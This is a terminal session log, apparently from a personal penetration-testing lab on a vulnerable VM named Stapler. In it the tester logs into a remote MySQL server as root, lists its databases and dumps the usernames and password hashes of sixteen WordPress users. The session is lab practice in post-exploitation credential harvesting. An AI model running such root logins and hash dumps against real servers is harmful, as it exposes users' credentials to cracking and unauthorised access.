al1ss0n@al1ss0n:~/Pentest/Labs/Personal/Stapler$ mysql -u root -p -h 192.168.2.179
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 145
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.


mysql> show databeses
    -> .
    -> ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'databeses
.' at line 1
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| loot               |
| mysql              |
| performance_schema |
| phpmyadmin         |
| proof              |
| sys                |
| wordpress          |
+--------------------+
8 rows in set (0.16 sec)

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
11 rows in set (0.00 sec)

mysql> describe wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(64)         | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   |     |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(60)         | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows in set (0.00 sec)

mysql> SELECT user_login, user_pass FROM wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
+------------+------------------------------------+
16 rows in set (0.00 sec)

mysql> 
